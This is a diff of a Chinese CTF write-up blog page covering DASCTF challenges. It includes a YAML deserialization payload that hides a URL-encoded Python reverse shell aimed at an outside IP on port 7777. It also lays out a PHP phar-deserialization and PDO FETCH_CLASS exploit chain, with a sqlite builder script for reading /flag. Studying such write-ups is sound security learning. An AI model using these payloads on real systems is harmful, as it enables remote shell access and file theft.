@@ -262,7 +262,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">2.5k字</span>
+        <span class="post-count">3.3k字</span>
       </span>
     </span>
 
@@ -271,7 +271,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">13分</span>
+        <span class="post-count">16分</span>
       </span>
     </span>
     
@@ -706,7 +706,7 @@ file_pattern <span class="token operator">=</span> re<span class="token punctuat
   <span class="token punctuation">-</span> <span class="token punctuation">&#123;</span><span class="token key atrule">"extend"</span><span class="token punctuation">:</span> <span class="token tag">!!python/name:exec</span> <span class="token punctuation">&#125;</span>
 <span class="token key atrule">listitems</span><span class="token punctuation">:</span> <span class="token string">"import urllib; exec(urllib.parse.unquote('%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%33%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%6f%73%2c%70%74%79%2c%73%6f%63%6b%65%74%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%31%31%2e%78%78%78%2e%78%78%78%2e%31%35%39%22%2c%37%37%37%37%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%29%66%6f%72%20%66%20%69%6e%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%5c%27%27%29'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="预期-1"><a href="#预期-1" class="headerlink" title="预期"></a>预期</h2><p>之前 sctf 提过在 wsgi 头打内存马的操作，这次就是利用这一手操作实现回显</p>
+<h2 id="预期-1"><a href="#预期-1" class="headerlink" title="预期"></a>预期</h2><p>之前 <a href="https://c1oudfl0w0.github.io/blog/2024/09/28/SCTF-2024/#%E9%A2%84%E6%9C%9F%EF%BC%9AWSGI%E5%B8%A6%E5%87%BA%E5%9B%9E%E6%98%BE">sctf</a> 提过在 wsgi 头带出回显的操作，这次就是利用这一手操作实现回显</p>
 <p>修改 WSGIRequestHandler 对象 server_version 的值</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> werkzeug
 <span class="token builtin">setattr</span><span class="token punctuation">(</span>werkzeug<span class="token punctuation">.</span>serving<span class="token punctuation">.</span>WSGIRequestHandler<span class="token punctuation">,</span> <span class="token string">"server_version"</span><span class="token punctuation">,</span><span class="token string">'想要带出的数据'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -724,7 +724,163 @@ file_pattern <span class="token operator">=</span> re<span class="token punctuat
 
 <p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250122001931230.png" alt="image-20250122001931230"></p>
 <hr>
-<h1 id="strange-php（Unsolved）"><a href="#strange-php（Unsolved）" class="headerlink" title="strange_php（Unsolved）"></a>strange_php（Unsolved）</h1>
+<h1 id="strange-php（Unsolved）"><a href="#strange-php（Unsolved）" class="headerlink" title="strange_php（Unsolved）"></a>strange_php（Unsolved）</h1><p>审一下源码，看一下主要逻辑</p>
+<p>welcome.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$action</span><span class="token punctuation">;</span>
+    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">case</span> <span class="token string single-quoted-string">'message'</span><span class="token punctuation">:</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"write messageing"</span><span class="token punctuation">;</span>
+            <span class="token variable">$decodedMessage</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'encodedMessage'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">writeMessage</span><span class="token punctuation">(</span><span class="token variable">$decodedMessage</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"写入失败"</span><span class="token punctuation">;</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token variable">$filePath</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">get_filePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$filePath</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"留言已写入: "</span><span class="token operator">.</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">get_filePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token keyword">case</span> <span class="token string single-quoted-string">'editMessage'</span><span class="token punctuation">:</span>
+                <span class="token variable">$decodedEditMessage</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'encodedEditMessage'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">editMessage</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$decodedEditMessage</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"留言已成功更改"</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"操作失败，请重新尝试"</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">:</span>
+            <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">deleteMessage</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"留言已成功删除"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"操作失败，请重新尝试"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token keyword">case</span> <span class="token string single-quoted-string">'clean'</span><span class="token punctuation">:</span>
+                <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm log/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm txt/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>能写入或删除任意txt，并且写入路径可知</p>
+<p>跟进一下相关功能的函数</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">writeMessage</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// 写入留言到文件中</span>
+    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filePath</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">deleteMessage</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token operator">.</span><span class="token string double-quoted-string">".txt"</span><span class="token punctuation">;</span>
+    <span class="token comment">// 删除留言文件</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$msg</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>unlink处明显可以打phar反序列化，path 是我们可控的，写入文件的内容也没有限制</p>
+<p>然后看 __set 方法</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span>  <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filePath</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/log/"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filePath</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".txt"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>filePath 可控，可以实现任意文件读取</p>
+<p>那么如何触发 __set 呢？</p>
+<p>本着这种题目给的东西都有利用可能的原则，猜测要在数据库这里做文章</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">PDO_connect</span><span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">private</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$con_options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//use to set options of PDO connections</span>
+    <span class="token keyword">public</span> <span class="token variable">$smt</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+            <span class="token string double-quoted-string">"dsn"</span><span class="token operator">=></span><span class="token string double-quoted-string">"mysql:host=localhost:3306;dbname=users;charset=utf8"</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'host'</span><span class="token operator">=></span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'port'</span><span class="token operator">=></span><span class="token string single-quoted-string">'3306'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'user'</span><span class="token operator">=></span><span class="token string single-quoted-string">'joker'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'password'</span><span class="token operator">=></span><span class="token string single-quoted-string">'joker'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'charset'</span><span class="token operator">=></span><span class="token string single-quoted-string">'utf8'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'options'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token operator">=></span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">,</span>
+                <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span> <span class="token operator">=></span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con_options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_DEFAULT_FETCH_MODE</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Connection Error: '</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里专门给了一个 con_options 可控，可以猜测在 options 处入手</p>
+<blockquote>
+<p>通过<code>User::__destruct</code>-&gt;<code>User::log</code> ,User::log 指定查询数据库来源，设定<code>&quot;options&quot;=&gt;[PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_CLASS|PDO::FETCH_CLASSTYPE,]]</code>，使得<strong>查询结果第一列返回结果作为类名实例化</strong>，之后的结果会变成属性名和属性值进行赋值，对于未定义的属性会触发这个类的<code>__set</code>方法。比如说数据库第一行结果为 UserMessage，那么会实例化 UserMessage</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/pdostatement.fetch.php">https://www.php.net/manual/zh/pdostatement.fetch.php</a></p>
+<p><img src="/blog/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250131230900317.png" alt="image-20250131230900317"></p>
+<p>所以要构造一个数据库，不出网的情况下当然是要选择 sqlite 这种基于文件的数据库，如果出网也可以直接连到 vps 上的mysql</p>
+<p>使用 python 生成一个</p>
+<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">def gen_db(db_path):
+    conn &#x3D; sqlite3.connect(db_path)
+    cursor &#x3D; conn.cursor()
+    cursor.execute(&#39;&#39;&#39;
+    CREATE TABLE IF NOT EXISTS users (
+
+        username TEXT NOT NULL,
+        filePath TEXT NOT NULL,
+        password TEXT NOT NULL,
+
+        id INTEGER PRIMARY KEY AUTOINCREMENT
+    )
+    &#39;&#39;&#39;)
+    users &#x3D; [
+        (&#39;UserMessage&#39;, &#39;&#x2F;flag&#39;, &#39;&#x2F;flag&#39;),
+    ]
+    cursor.executemany(&#39;&#39;&#39;
+    INSERT INTO users (username, password,filePath) VALUES (?,?,?)
+    &#39;&#39;&#39;, users)
+    conn.commit()
+    cursor.execute(&#39;SELECT * FROM users&#39;)
+    conn.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
     </div>
     
     
